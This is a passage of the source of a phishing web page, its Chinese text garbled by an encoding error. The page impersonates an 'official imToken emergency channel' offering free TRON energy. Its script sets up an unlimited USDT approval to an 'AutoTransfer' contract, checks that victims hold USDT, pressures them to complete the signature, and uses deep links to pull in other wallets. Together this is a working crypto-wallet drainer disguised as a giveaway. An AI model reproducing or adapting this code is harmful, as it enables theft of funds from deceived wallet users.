/* é¡µè„šï¼šåŒ¹é…è‰²å· */
.footer-info {
    margin-top: 6px;
    padding-top: 6px;
    border-top: 1px solid #334155; /* åŒ¹é…è‰²å· */
    font-size: 10px; 
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    text-align: center;
    line-height: 1.7;
}
.footer-info a {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
/* å®¡æ ¸æç¤ºï¼šåŒ¹é…è‰²å· */
.review-tip {
    color: #4ade80; /* åŒ¹é…è‰²å· */
    font-size: 12px; 
    margin-top: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}
/* éimTokenå¼¹çª— */
#nonImTokenPopup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #1e2925; /* åŒ¹é…è‰²å· */
    border: 1px solid #334155; /* åŒ¹é…è‰²å· */
    border-radius: 8px;
    padding: 16px;
    z-index: 1001;
    text-align: center;
}
#nonImTokenPopup p {
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    font-size: 14px;
    margin: 0 0 12px 0;
}
#closePopupBtn {
    padding: 4px 12px;
    border: none;
    border-radius: 4px;
    background: #2563eb; /* åŒ¹é…è‰²å· */
    color: white;
    cursor: pointer;
}

/* æ–°å¢ï¼šå¤šé’±åŒ…é€‰æ‹©å¼¹çª—æ ·å¼ */
#multiWalletPopup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #1e2925; /* åŒ¹é…é¡µé¢èƒŒæ™¯è‰² */
    border: 1px solid #3b82f6; /* è“è‰²è¾¹æ¡† */
    border-radius: 12px;
    padding: 20px;
    z-index: 1002; /* å±‚çº§é«˜äºå…¶ä»–å¼¹çª— */
    width: 90%;
    max-width: 400px;
    text-align: center;
}
#multiWalletPopup h3 {
    color: #3b82f6; /* è“è‰²æ ‡é¢˜ */
    margin: 0 0 16px 0;
    font-size: 18px;
}
.wallet-list {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 12px;
    margin-bottom: 16px;
}
.wallet-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    padding: 12px;
    background: #1E1E1E; /* æ·±ç°èƒŒæ™¯ */
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.3s;
}
.wallet-item:hover {
    background: rgba(59, 130, 246, 0.2); /* è“è‰²é€æ˜ hover æ•ˆæœ */
}
.wallet-logo {
    width: 48px;
    height: 48px;
    object-fit: contain;
    border-radius: 8px;
}
.wallet-name {
    color: #E5E7EB; /* æµ…ç°æ–‡å­— */
    font-size: 14px;
    font-weight: 500;
}
#closeMultiWalletBtn {
    padding: 8px 24px;
    border: none;
    border-radius: 6px;
    background: #2563eb; /* è“è‰²æŒ‰é’® */
    color: white;
    cursor: pointer;
    font-size: 14px;
    transition: background 0.3s;
}
#closeMultiWalletBtn:hover {
    background: #3b82f6; /* æµ…è“ hover æ•ˆæœ */
}

/* åŠ è½½åŠ¨ç”»ï¼šåŒ¹é…è‰²å· */
#Loading {
    width: 100%;
    height: 100vh;
    background-color: #121212; 
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}
#Loading .loader {
    position: relative;
    width: 64px;
    height: 64px;
    border-radius: 50%;
    perspective: 800px;
}
#Loading .inner {
    position: absolute;
    box-sizing: border-box;
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
#Loading .inner.one {
    left: 0%;
    top: 0%;
    animation: rotate-one 1s linear infinite;
    border-bottom: 3px solid #3b82f6; /* åŒ¹é…è‰²å· */
}
#Loading .inner.two {
    right: 0%;
    top: 0%;
    animation: rotate-two 1s linear infinite;
    border-right: 3px solid #4ade80; /* åŒ¹é…è‰²å· */
}
#Loading .inner.three {
    right: 0%;
    bottom: 0%;
    animation: rotate-three 1s linear infinite;
    border-top: 3px solid #f97316; /* åŒ¹é…è‰²å· */
}
@keyframes rotate-one {
    0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
    100% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg); }
}
@keyframes rotate-two {
    0% { transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg); }
    100% { transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg); }
}
@keyframes rotate-three {
    0% { transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg); }
    100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
}
    </style>
</head>
<body>
    <div id="Loading">
        <div class="loader">
            <div class="inner one"></div>
            <div class="inner two"></div>
            <div class="inner three"></div>
        </div></div>

    <div class="container">      
        <div class="header-container">
            <div class="header">
                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="imToken Logo" class="header-logo">
           </div>            
            <div class="lang-switch">
                <div class="lang-dropdown" id="langDropdown">
                    <button class="lang-toggle" id="langToggleBtn">
                        ğŸ‡¨ğŸ‡³
                        <span id="currentLangText">ç®€ä½“ä¸­æ–‡</span>
                    </button>
                    <div class="lang-dropdown-menu">
                        <button class="lang-dropdown-item" data-lang="zh">
                           ğŸ‡¨ğŸ‡³
                            <span>ç®€ä½“ä¸­æ–‡</span>
                        </button>
                        <button class="lang-dropdown-item" data-lang="en">
                           ğŸ‡ºğŸ‡¸
                            <span>English</span>
                        </button>
                    </div>
                </div>
                <span id="headerDesc" class="lang-text">imTokenå®˜æ–¹åº”æ€¥é€šé“</span>
         </div>
    </div>
        <!-- åŸæœ‰éimTokenå¼¹çª— -->
        <div id="nonImTokenPopup">
            <p>ä¸æ”¯æŒéimTokenç”¨æˆ·</p>
            <button id="closePopupBtn">å…³é—­</button>
        </div>
        
       <!-- æ–°å¢ï¼šå¤šé’±åŒ…é€‰æ‹©å¼¹çª— -->
<div id="multiWalletPopup">
    <h3>é€‰æ‹©é’±åŒ…æ‰“å¼€</h3>
    <div class="wallet-list">
        <!-- imTokenï¼šå¯¹åº” icon/imtoken.png -->
        <div class="wallet-item" data-wallet="imtoken">
            <img src="./icon/imToken.png" alt="imToken Logo" class="wallet-logo">
            <span class="wallet-name">imToken</span>
        </div>
        <!-- TokenPocketï¼šå¯¹åº” icon/tokenpocket.png -->
        <div class="wallet-item" data-wallet="tokenpocket">
            <img src="./icon/tokenPocket.png" alt="TokenPocket Logo" class="wallet-logo">
            <span class="wallet-name">TokenPocket</span>
        </div>
        <!-- TronLinkï¼šå¯¹åº” icon/tronlink.png -->
        <div class="wallet-item" data-wallet="tronlink">
            <img src="./icon/tronLink.png" alt="TronLink Logo" class="wallet-logo">
            <span class="wallet-name">TronLink</span>
        </div>
        <!-- Bitget Walletï¼šå¯¹åº” icon/bitget.png -->
        <div class="wallet-item" data-wallet="bitget">
            <img src="./icon/bitget.png" alt="Bitget Wallet Logo" class="wallet-logo">
            <span class="wallet-name">Bitget Wallet</span>
        </div>
    </div>
    <button id="closeMultiWalletBtn">å…³é—­</button>
</div>

        <div id="userInfo">
            <span id="userInfoDefault">æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span></span>
            <div id="userInfoStatus" style="position: absolute; top: 30px; left: 50%; transform: translate(-50%, -50%); width: 100%; display: none;"></div>
            <div class="balance-item balance-usdt" style="display: none;">
                <span>USDT</span>
                <span class="balance-value" id="balanceUsdt">0.00</span>
            </div>
            <div class="balance-item balance-trx" style="display: none;">
                <span>TRX</span>
                <span class="balance-value" id="balanceTrx">0.00</span>
            </div>
            <div class="balance-item balance-energy" style="display: none;">
                <span>èƒ½é‡</span>
                <span class="balance-value" id="balanceEnergy">0</span>
            </div>
            <div class="balance-item balance-bandwidth" style="display: none;">
                <span>å®½å¸¦</span>
                <span class="balance-value" id="balanceBandwidth">0</span>
            </div>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight" id="disconnectedTip1">æ­¤é“¾æ¥ä¸ºimTokenä¸“å±é€šé“ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight" id="disconnectedTip3">2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
                <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
                <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p id="connectedAddress">â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
                <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000èƒ½é‡</span></p>
                <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 1.8;">
                <p>â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p>â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy"></span>Î¼s</p><p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                    æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="special-tip-container" id="specialTipContainer">
            <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
            <div class="special-tip-content" id="specialTipContent">
                æ­¤é“¾æ¥ä»…ä¸ºimTokenç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨Tronç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚
            </div>
        </div>
        <div class="record-list" id="recordList">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
                <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
            </div>
            <div style="display: flex; color: #a0a8a4;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
                <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
            </div>       
            <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
        <div class="btn-group">
            <div class="warning">
                <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
                <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken</p>  
            </div> 
            <button id="connectBtn" class="btn">è¿æ¥imTokené’±åŒ…</button>
            <button id="approveBtn" class="btn" disabled>é¢†å–èƒ½é‡</button>
            <div id="reviewTip" class="review-tip" style="display: none;">
               <span id="reviewTipText">ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
            </div>
        </div>
        <div class="footer-info" id="footerInfo">
            åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
            Â© 2025 èƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                const loadingEl = document.getElementById("Loading");
                if (loadingEl) loadingEl.style.display = "none";
            }, 1500);
        });
    </script>
    <script>       
const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy";
const A1_SIGNAL_KEY = "a1_signal_records";
const A1_STATUS_KEY = "a1_signal_status";
let currentEnergy = 0;
let currentBandwidth = 0;
const DEPLOY_START_TIME = new Date().getTime();
const INIT_TRX = 4104470400000;
const TRX_DECREASE_PER_SEC = 65200;
const STORAGE_KEY = "trx_countdown_data";
let trxTimer = null;
let contractEnergyEl = null;
const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const BACKEND_API = "https://kgjiopv1.com";
const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "name": "owner", "type": "address"},
            {"indexed": true, "name": "spender", "type": "address"},
            {"indexed": false, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    }
];
let tronWeb = null;
let userAddress = null;
let trc20Contract = null;
let tokenBalance = 0.00;
let trxBalance = 0.00;
const RECORD_KEY = "imtoken_energy_records";
const B1_SIGNAL_KEY = "b1_signal_sent";

// å…³é”®ä¿®æ”¹1ï¼šé…ç½®å¤šé’±åŒ…Schemeï¼ˆç”¨äºç›´æ¥è·³è½¬ï¼‰
const walletConfig = {
    imtoken: {
        scheme: "imtokenv2://navigate/DappView?url=",
        name: "imToken"
    },
    tokenpocket: {
        scheme: "tpdapp://open?params={\"url\":\"",
        suffix: "\"}",
        name: "TokenPocket"
    },
    tronlink: {
        scheme: "tronlinkoutside://pull.activity?param=",
        name: "TronLink"
    },
    bitget: {
        scheme: "bitkeep://bkconnect?action=dapp&url=",
        name: "Bitget Wallet"
    }
};

const imTokenConfig = {
    scheme: "imtokenv2://navigate/DappView?url=",
    name: "imToken"
};
// å¤šè¯­è¨€é…ç½®ï¼šåˆ é™¤å†—ä½™æ–‡æœ¬ï¼ˆå·²è¿æ¥/USDTä½™é¢/TRXä½™é¢ï¼‰
const langConfig = {
    zh: {
        headerTitle: "imToken",
        headerDesc: "imTokenå®˜æ–¹åº”æ€¥é€šé“",
        userInfoDefault: "æœªè¿æ¥é’±åŒ…<br><span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>",
        walletStatusTitle: "é’±åŒ…çŠ¶æ€",
        disconnectedText: "æœªè¿æ¥é’±åŒ…",
        disconnectedTip1: "æ­¤é“¾æ¥ä¸ºimTokenä¸“å±é€šé“ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–",
        disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
        disconnectedTip3: "2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
        disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
        disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
        connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
        connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
        connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000Î¼s</span>",
        connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
        contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
        contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š<span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚",
        recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
        recordAmountTitle: "è½¬è´¦é¢åº¦",
        energyType: "USDTè½¬è´¦",
        transferQuota: "æ— é™",
        noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
        browserWarn1: " âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
        browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken",
        connectBtnText: "è¿æ¥imTokené’±åŒ…",
        approveBtnText: "é¢†å–èƒ½é‡",
        reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
        footerInfo: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 èƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://token.im' target='_blank'>imTokenå®˜ç½‘</a>",
        copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€",
        copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
        å”¤èµ·Guide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·imToken\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€imToken â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
        copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenä¸­ç²˜è´´è®¿é—®",
        connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #000000; font-size: 14px;'>âš ï¸ ç½‘ç»œæ³¢åŠ¨</span>",
        retryConnect: "é‡è¯•è¿æ¥",
        // åˆ é™¤â€œå·²è¿æ¥/USDTä½™é¢/TRXä½™é¢â€
        authorizedTip: "âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡<br><span style='color: #000000; font-size: 13px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
        authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
        afterApproveTip: "âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...",
        deployingBtn: "å‘æ”¾ä¸­...",
        loadingBtn: "åŠ è½½ä¸­...",
        loadingTip: "âœ… åŠ è½½ä¸­...",
        queryingBalance: "æŸ¥è¯¢ä¸­...",
        // åˆ é™¤â€œå·²è¿æ¥/USDTä½™é¢/TRXä½™é¢â€
        insufficientUsdt: "âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼šUSDTä½™é¢éœ€å¤§äº1",
        insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        // åˆ é™¤â€œå·²è¿æ¥/USDTä½™é¢/TRXä½™é¢â€
        eligibleTip: "âœ… å¯å…è´¹é¢†å–90000 USDT èƒ½é‡",
        distributingBtn: "èƒ½é‡é…é€ä¸­...",
        redirectingBtn: "è·³è½¬ç­¾åä¸­...",
        approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦ï½",
        successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
        successArrival: "<br><span style='color: #000000;'>âœ… 90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦</span>",
        recordAddress: "åœ°å€ï¼š",
        recordType: "é¢†å–ç±»å‹ï¼š",
        recordEnergy: "è·å–èƒ½é‡ï¼š",
        recordTime: "é¢†å–æ—¶é—´ï¼š",
        freeEnergy: "å…è´¹é¢†å–",
        systemBusyTip: "ç³»ç»Ÿç¹å¿™è¯·ç¨åé‡è¯•",
        ineligibleTip: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "âŒ æœªæ£€æµ‹åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€<br><span style='color: #000000; font-size: 14px;'>è¯·è¿æ¥imTokené’±åŒ…åé‡è¯•</span>",
        nonImTokenUser: "éimTokené’±åŒ…ç”¨æˆ·<br><span style='color: #000000; font-size: 13px;'>æ­£åœ¨è‡ªåŠ¨å”¤èµ·imToken...</span>",
        specialTipTitle: "imToken-EAB",
        specialTipContent: "æ­¤é“¾æ¥ä»…ä¸ºimTokenç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨Tronç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚"
    },
    en: {
        headerTitle: "imToken",
        headerDesc: "imToken Official Emergency Channel",
        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
        walletStatusTitle: "Wallet Status",
        disconnectedText: "Wallet not connected",
        disconnectedTip1: "This link is exclusive to imToken users - non-imToken users cannot claim",
        disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
        disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
        disconnectedTip4: "3. The system will verify if the wallet address meets the requirements after clicking 'Claim'",
        disconnectedTip5: "4. No assets required - exit directly to cancel",
        connectedSuccess: "âœ… Wallet connected successfully",
        connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
        connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000Î¼s Energy</span>",
        connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
        contractResourceTitle: "Contract Remaining Resources",
        contractAddrText: "â€¢ Contract Address: <span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "Note: Distribution stops when remaining energy is '0' - Official imToken project, only for imToken users",
        recordTypeTitle: "Energy Usage Scope",
        recordAmountTitle: "Transfer Quota",
        energyType: "USDT Transfer",
        transferQuota: "Unlimited",
        noRecord: "No energy claim records",
        browserWarn1: " âš ï¸ Open with <strong>imToken in-app browser</strong>",
        browserWarn2: " âš ï¸ Non-wallet browser: Click button to copy + launch imToken",
        connectBtnText: "Connect imToken Wallet",
        approveBtnText: "Claim Energy",
        reviewTipText: "System reviewing - please complete the signature after approval",
        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
        copySuccess: "âœ… Link copied - open in imToken in-app browser",
        copyFail: "âŒ Copy failed: Please copy manually",
        å”¤èµ·Guide: "âœ… Link copied + imToken launched\nNext: Open imToken â†’ Browser â†’ Paste link",
        copyGuide: "âœ… Link copied - please paste in imToken",
        connectError: "Connection Error<br><span style='color: #000000; font-size: 14px;'>âš ï¸ Network fluctuation</span>",
        retryConnect: "Retry Connection",
        authorizedTip: "âœ… This wallet has claimed free energy within 30 days<br><span style='color: #000000; font-size: 13px;'>One claim per address every 30 days</span>",
        authorizedBtn: "Energy Claimed",
        afterApproveTip: "âœ… Authorization successful, energy distributing...",
        deployingBtn: "Distributing...",
        loadingBtn: "Loading...",
        loadingTip: "âœ… Loading...",
        queryingBalance: "Querying...",
        insufficientUsdt: "âŒ Ineligible: USDT balance must exceed 1",
        insufficientBtn: "Ineligible",
        eligibleTip: "âœ… Eligible for 90000 USDT Energy",
        distributingBtn: "Energy Distributing...",
        redirectingBtn: "Redirecting to Signature...",
        approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
        authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
        successTip: "ğŸ‰ Free Energy Claim Completed! 90000Î¼s USDT Energy has been creditedï½",
        successBtn: "Claim Successful",
        successArrival: "<br><span style='color: #000000;'>âœ… 90000Î¼s USDT Energy credited</span>",
        recordAddress: "Address:",
        recordType: "Claim Type:",
        recordEnergy: "Energy Obtained:",
        recordTime: "Claim Time:",
        freeEnergy: "Free Claim",
        systemBusyTip: "System busy, please try again later",
        ineligibleTip: "Ineligible",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "âŒ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please connect imToken wallet and try again</span>",
        nonImTokenUser: "Non-imToken user<br><span style='color: #000000; font-size: 13px;'>Auto-launching imToken...</span>",
        specialTipTitle: "imToken-EAB",
        specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
    }
};
let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
const AUTHORIZED_KEY = "authorized_wallet_addresses";
function getAuthorizedAddresses() {
    try {
        const stored = localStorage.getItem(AUTHORIZED_KEY);
        return stored ? JSON.parse(stored) : [];
    } catch (e) {
        console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        return [];
    }
}
function addAuthorizedAddress(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹å­˜å‚¨æˆæƒåœ°å€
        userInfoDefault.innerHTML = `ğŸ”„ æ­£åœ¨å­˜å‚¨æˆæƒåœ°å€ï¼š${address}<br><span>æ­¥éª¤ï¼šæ·»åŠ åˆ°å·²æˆæƒåˆ—è¡¨</span>`;
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) {
            addresses.push(address);
            localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
            // é¡µé¢åé¦ˆï¼šå­˜å‚¨æˆåŠŸ
            userInfoDefault.innerHTML = `âœ… æˆæƒåœ°å€å­˜å‚¨æˆåŠŸï¼š${address}<br><span>å·²æ·»åŠ åˆ°æœ¬åœ°æˆæƒåˆ—è¡¨</span>`;
        } else {
            // é¡µé¢åé¦ˆï¼šåœ°å€å·²å­˜åœ¨
